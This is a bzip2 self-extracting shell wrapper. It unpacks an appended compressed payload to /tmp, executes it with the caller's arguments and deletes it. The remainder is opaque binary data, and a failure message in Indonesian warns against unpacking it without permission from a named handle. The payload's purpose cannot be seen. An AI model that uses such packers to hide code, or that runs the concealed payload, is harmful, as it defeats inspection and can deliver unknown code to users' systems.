#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY$��� S_�u������������PD@  `gԋ�i��  	B2i��~F�5O�)���M4�Ci�iG�m6��OI��1�@ 4� hi�@44i�4 p� �@`�i�d � OJL��7�Bh��CCF 4z��CFA�@ 4� hi�@44i�4 $Jb CI��J?�hjOQ��z�f��y@��)���ڡ2 P��ejz�_߷W�x����c��v�A}�����+
��s�x��ofa���=^9c�1�>}d,�+�C��j(��d#�ۣ�/�����k<�W��U�)�ڮT≾F���zL�D�z�9� �ͭKh����r�U.ቭ�&ê�Aa�� ��M�ޝdX����T�fr9j�ef���"�1"���	��϶գ-���6ye��GGd���-��[���nK��x�q^ϖy���i�$�J]��/�ς�j�f"��/��fhQ���*�U鋭�;�3!��s�R�� {C�������N���}>��9�J�QB�u /�\ ���0�L�d��(K"q�D��%�g�4�KQ�'��(�O
ܫi��e�~�`��`�v�����bA��ź[�A���i�ov+O_E�$�)SH��D6#��|�ae(!l��3����?#�o0�� �0��`��'(*�� 4}.Z��Z���n�y*��V�AV��!�Uϗ;0����g���F��%�5gT���0�z�9�����.:Hi�X߶��4�#�������_yǺ1͝�clD�?z$C�W�YP��J7R'^��J�5��_n���f��ː�D"_�
n�ˬܑNA����"\�.u÷FUe�A�Y�����n�b���mh��췔��jhFM.%8RE|��n9�v�m���S�bLx��iXI��������]��c��LP��Y��
��ʏ��1�+�_
��Xw\��w�W���6 ���r�x���ߴnϿY�AkIF�Y��R��ؚm���<�Vm̡f�\��@�O<�9v*W6My�����6ܖ����RT��+/��93�2��>�R�d����4��PYC=��>��{�T;�]xqh�u���Q��d �GemӠ��P����J��4(ZA¢/��這�*��y����A�]�����]��+���,I��q
眗&؜�I���5Teem(�r(�i��]�j����FG
��%�ר�����z��/9��0���0R�NJ�qQ�W�o��v���x�7�3#hc�G���ʷ@~_t#j�����3^��O]����;�w�e*�D!8�*����2�U�M���W%z "
 O���]%�ZT��e�7 ���e�傊�����RH%��n�l�1 ��s[	���B��3A)Cᚽ��#���-�R~NNv�nc��LH���x���oP��f�?�;J�.ͥ�A}`XX���5�KB�}+��pk{7D�~�b�5�o�[2��&m5?[��wM�^Yw�r4������斛�/V��Y�2�� @D�.�
� �H4��X�y5�YK,U�����)�,.���B�i0"�Z�&�,��o}�k��k 3׸+D�s��`�
ҙs��K�[�h4K~ԃ���S�?A����W������}��y"@ ��3���"�(Hda� 